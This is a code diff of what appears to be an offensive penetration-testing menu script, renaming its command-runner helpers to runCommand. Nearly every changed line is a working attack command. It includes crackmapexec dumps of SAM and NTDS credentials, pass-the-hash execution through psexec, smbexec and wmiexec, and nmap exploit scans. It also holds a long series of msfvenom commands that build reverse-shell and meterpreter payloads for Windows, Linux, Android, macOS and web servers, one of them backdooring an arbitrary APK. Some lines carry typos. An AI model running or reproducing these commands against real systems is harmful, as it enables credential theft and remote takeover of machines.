                print("\n[+] Checking priviliges...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
                print("\n[+] Enumerating users...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
                print("\n[+] Enumerating shares...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
                print("\n[+] Enumerating SAM...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
          else:
             print("[i] Using HASH value as password credential...")
             checkParams = test_PRT("5985")
             if checkParams != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
-               remotCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
+               runCommand("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
             checkParams = test_PRT("445")
             if checkParams != 1:
                print("\n[+] Checking priviliges...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami /priv")
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami /priv")
                print("\n[+] Enumerating users...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
                print("\n[+] Enumerating shares...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
                print("\n[+] Enumerating SAM...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
       prompt()	# EOF Error here for some reason?
                
 # ------------------------------------------------------------------------------------- 
@@ -2928,7 +2886,7 @@ while True:
          checkParams = test_DOM()               
       if checkParams != 1:
          print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n", colour3))
-         remotCOM(keyPath + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")         
+         runCommand(keyPath + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")         
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2945,7 +2903,7 @@ while True:
          checkParams = test_DOM()               
       if checkParams != 1:
          print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n", colour3))
-         remotCOM(keyPath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))               
+         runCommand(keyPath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))               
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2962,7 +2920,7 @@ while True:
          checkParams = test_DOM()         
       if checkParams != 1:
          print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n", colour3))
-         remotCOM(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+         runCommand(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2978,9 +2936,9 @@ while True:
       checkParams = test_WEB()
       if checkParams != 1:
          if WEB[:5].upper() == "HTTPS":
-            remotCOM("nikto -ssl   -h " + WEB.rstrip(" "))
+            runCommand("nikto -ssl   -h " + WEB.rstrip(" "))
          else:
-            remotCOM("nikto -nossl -h " + WEB.rstrip(" "))
+            runCommand("nikto -nossl -h " + WEB.rstrip(" "))
       else:
          if IP46 == "-4":
             checkParams = test_TIP()
@@ -2988,9 +2946,9 @@ while True:
             checkParams = test_DOM()
          if checkParams != 1:   
             if ":" in TIP:
-               remotCOM("nikto -h " + DOM.rstrip(" "))	# IP 6 ISSUES
+               runCommand("nikto -h " + DOM.rstrip(" "))	# IP 6 ISSUES
             else:
-               remotCOM("nikto -h " + TIP.rstrip(" "))
+               runCommand("nikto -h " + TIP.rstrip(" "))
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
@@ -3006,7 +2964,7 @@ while True:
       if checkParams != 1:
          if POR[:5] != "EMPTY":
             print(colored("[*] Scanning specified live ports only, please wait...", colour3))
-            remotCOM("nmap -sV -p " + PTS.rstrip(" ") + " --reason --script *vuln* --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")           
+            runCommand("nmap -sV -p " + PTS.rstrip(" ") + " --reason --script *vuln* --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")           
             catsFile("light.tmp")
          else:
             print("[-] No ports to scan...")
@@ -3025,7 +2983,7 @@ while True:
       if checkParams != 1:
          if POR[:5] != "EMPTY":
             print(colored("[*] Scanning specified live ports only, please wait...", colour3))
-            remotCOM("nmap -sV -p " + PTS.rstrip(" ")  + " --reason --script exploit --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
+            runCommand("nmap -sV -p " + PTS.rstrip(" ")  + " --reason --script exploit --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
             catsFile("light.tmp")
          else:
             print("[-] No ports to scan...")
@@ -3041,7 +2999,7 @@ while True:
 
    if selection == '64':
       services = input("[?] Please enter service name: ")
-      localCOM("searchsploit '" + services + "' > sploit.tmp")      
+      runCommand("searchsploit '" + services + "' > sploit.tmp")      
       nullTest = linecache.getline("sploit.tmp",1)      
       if "Exploits: No Results" in nullTest:
          print("[-] No exploits were found for service " + services + "...")
@@ -3052,7 +3010,7 @@ while True:
          print("[+] Exploits found...")
          catsFile("sploit.tmp") 
          services = input("[?] Please enter service name to download: ")
-         localCOM("searchsploit -m '" + services + "'")
+         runCommand("searchsploit -m '" + services + "'")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3069,74 +3027,74 @@ while True:
          if OSF[:7] == "WINDOWS":
             print(colored("[*] Creating microsoft windows exploits...", colour3))
             if not os.path.exists(explDir + "/staged"):
-               localCOM("mkdir " + explDir + "/staged")
+               runCommand("mkdir " + explDir + "/staged")
             if not os.path.exists(explDir + "/stageless"):
-               localCOM("mkdir " + explDir + "/stageless")
+               runCommand("mkdir " + explDir + "/stageless")
             print("[+] Manufacturing staged exploits...")   
-            localCOM("msfvenom -p windows/x64/shell/reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_shell_reverse_tcp.exe > arsenal.tmp 2>&1")
-            localCOM("msfvenon -p windows/shell/reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")         
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/shell/reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_shell_reverse_tcp.exe > arsenal.tmp 2>&1")
+            runCommand("msfvenon -p windows/shell/reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")         
+            runCommand("msfvenom -p windows/x64/meterpreter/reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter/reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
             if TIP[:5] != "EMPTY":
-               localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
-               localCOM("msfvenom -p windows/meterpreter/bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows/x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+               runCommand("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+               runCommand("msfvenom -p windows/meterpreter/bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows/x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
             print("[+] Manufacturing stageless exploits...")                            
-            localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORP=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter_reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter_reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter_reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter_reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter_reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter_reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter_reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")           
-            localCOM("msfvenom -p windows/meterpreter_reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORP=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter_reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter_reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter_reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter_reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter_reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/meterpreter_reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p windows/x64/meterpreter_reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")           
+            runCommand("msfvenom -p windows/meterpreter_reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
             if TIP[:5] != "EMPTY":
-               localCOM("msfvenom -p windows/x64/meterpreter_bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
-               localCOM("msfvenom -p windows/meterpreter_bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+               runCommand("msfvenom -p windows/x64/meterpreter_bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+               runCommand("msfvenom -p windows/meterpreter_bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
 
-#            localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
-#            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
+#            runCommand("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
+#            runCommand("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
             
          if OSF[:5] == "LINUX":
             print(colored("[*] Creating linux exploits...", colour3))
-            localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_tcp.elf>> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_tcp.elf >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_bind_tcp.elf >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x66_shell_bind_tcp.elf >> arsenal.tmp 2>&1")         
+            runCommand("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_tcp.elf>> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_tcp.elf >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_bind_tcp.elf >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x66_shell_bind_tcp.elf >> arsenal.tmp 2>&1")         
 
          if OSF[:7] == "ANDROID":
             print(colored("[*] Creating android exploits...", colour3))
-#           localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_meterpreter_reverse_tcp.apk >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_meterpreter_reverse_http.apk >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_meterpreter_reverse_https.apk >> arsenal.tmp 2>&1")         
+#           runCommand("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_meterpreter_reverse_tcp.apk >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_meterpreter_reverse_http.apk >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_meterpreter_reverse_https.apk >> arsenal.tmp 2>&1")         
          if OSF[:4] == "OS X":
             print(colored("[*] Creating mac exploits...", colour3))
-            localCOM("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/osx_x86_shell_reverse_tcp.macho >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p osx/x86/shell_bind_tcp                     RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/osx_x86_shell_bind_tcp.macho >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/osx_x86_shell_reverse_tcp.macho >> arsenal.tmp 2>&1")
+            runCommand("msfvenom -p osx/x86/shell_bind_tcp                     RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/osx_x86_shell_bind_tcp.macho >> arsenal.tmp 2>&1")
          if OSF[:3] == "IOS":
             print(colored("[*] Creating ios exploits...", colour3))
             print("NOT IMPLEMENTED")            
 
          print(colored("[*] Creating other exploits that you might require...", colour3))
-         localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/windows_meterpreter_reverse_tcp.asp >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f aspx   -o " + explDir + "/windows_meterpreter_reverse_tcp.aspx >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/java_jsp_shell_reverse_tcp.war >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_bash.sh >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_python.py >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_perl.pl >> arsenal.tmp 2>&1")
-         localCOM("chmod +X *.*")
+         runCommand("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
+         runCommand("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
+         runCommand("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/windows_meterpreter_reverse_tcp.asp >> arsenal.tmp 2>&1")
